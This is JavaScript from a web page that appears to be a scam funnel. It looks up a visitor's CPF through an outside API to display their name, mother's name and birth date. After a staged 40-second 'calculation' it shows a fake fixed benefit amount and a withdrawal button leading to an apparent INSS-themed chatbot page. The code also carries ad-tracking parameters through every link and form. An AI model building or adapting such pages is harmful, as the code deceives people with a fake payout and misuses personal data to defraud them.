<script>
(function () {
  const PARAMS = [
    'utm_source',
    'utm_medium',
    'utm_campaign',
    'utm_content',
    'utm_term',
    'src',
    'sck',
    'xcod',
    'gclid',
    'fbclid',
    'ttclid'
  ];

  const COOKIE_DAYS = 30;

  function setCookie(name, value) {
    const maxAge = COOKIE_DAYS * 24 * 60 * 60;
    document.cookie =
      encodeURIComponent(name) + '=' + encodeURIComponent(value) +
      '; path=/; max-age=' + maxAge + '; SameSite=Lax';
  }

  function getCookie(name) {
    const encoded = encodeURIComponent(name) + '=';
    return document.cookie
      .split(';')
      .map(function (item) { return item.trim(); })
      .filter(function (item) { return item.indexOf(encoded) === 0; })
      .map(function (item) { return decodeURIComponent(item.slice(encoded.length)); })[0] || '';
  }

  function getCurrentTracking() {
    const url = new URL(window.location.href);
    const data = {};

    PARAMS.forEach(function (param) {
      const fromUrl = url.searchParams.get(param);
      const fromCookie = getCookie(param);
      const value = fromUrl || fromCookie;

      if (value) {
        data[param] = value;
        setCookie(param, value);
      }
    });

    return data;
  }

  function appendTrackingToUrl(href, tracking) {
    if (!href || href.startsWith('#') || href.startsWith('javascript:') || href.startsWith('mailto:') || href.startsWith('tel:')) {
      return href;
    }

    let url;
    try {
      url = new URL(href, window.location.href);
    } catch (e) {
      return href;
    }

    if (url.origin !== window.location.origin) {
      return href;
    }

    Object.keys(tracking).forEach(function (key) {
      if (!url.searchParams.has(key)) {
        url.searchParams.set(key, tracking[key]);
      }
    });

    return url.toString();
  }

  const tracking = getCurrentTracking();

  if (!Object.keys(tracking).length) {
    return;
  }

  document.querySelectorAll('a[href]').forEach(function (link) {
    link.href = appendTrackingToUrl(link.getAttribute('href'), tracking);
  });

  document.querySelectorAll('form').forEach(function (form) {
    PARAMS.forEach(function (param) {
      if (!tracking[param]) return;

      let input = form.querySelector('input[name="' + param + '"]');

      if (!input) {
        input = document.createElement('input');
        input.type = 'hidden';
        input.name = param;
        form.appendChild(input);
      }

      input.value = tracking[param];
    });
  });
})();

<script>
  function getURLParameter(name) {
    const urlParams = new URLSearchParams(window.location.search);
    return urlParams.get(name);
  }

async function buscarDadosCPF(cpf) {
  try {
    const response = await fetch(`https://meuappconsulta.digital/api.php?cpf=${cpf}&_=${Date.now()}`);
    if (!response.ok) throw new Error(`Erro API: ${response.status}`);
    const data = await response.json();
    console.log("📥 Retorno API:", data);
    return data;
  } catch (error) {
    console.error("❌ Erro ao buscar dados do CPF:", error);
    return null; 
  }
}

async function carregarDados() {
  const cpfURL = getURLParameter('cpf');
  const cpfStorage = localStorage.getItem('cpf');
  const cpf = cpfURL || cpfStorage || '---';

  if (cpf && cpf !== '---' && cpf.length >= 11) {
    const dadosAPI = await buscarDadosCPF(cpf);

    if (dadosAPI && dadosAPI.dados && dadosAPI.dados.length > 0) {
      const info = dadosAPI.dados[0];

      const nome = info.nome || '---';
      const mae = info.nome_mae || '---';
      const nascimento = info.data_nascimento || '---';

      document.getElementById('nome').innerText = nome;
      document.getElementById('cpf').innerText = cpf;
      document.getElementById('mae').innerText = mae;
      document.getElementById('nascimento').innerText = nascimento;

      localStorage.setItem('nome', nome);
      localStorage.setItem('cpf', cpf);
      localStorage.setItem('mae', mae);
      localStorage.setItem('nascimento', nascimento);

      console.log("✅ Dados carregados:", { nome, cpf, mae, nascimento });
    } else {
      document.getElementById('cpf').innerText = cpf;
      document.getElementById('nome').innerText = localStorage.getItem('nome') || 'Desconhecido';
      document.getElementById('mae').innerText = localStorage.getItem('mae') || '---';
      document.getElementById('nascimento').innerText = localStorage.getItem('nascimento') || '---';
    }
  }
}
  carregarDados();

  // Simula cálculo e libera botão após 40 segundos
  setTimeout(() => {
    document.getElementById('valor').innerText = `R$ 9.546,70`;
    document.getElementById('btnSaque').style.display = 'block';
  }, 40000);

  document.getElementById('btnSaque').addEventListener('click', function () {
    const queryParams = new URLSearchParams(window.location.search);
    const cpf = getURLParameter('cpf') || localStorage.getItem('cpf');
    if (cpf) queryParams.set('cpf', cpf);

    window.location.href = '../chatbotinss/?' + queryParams.toString();
  });
</script>
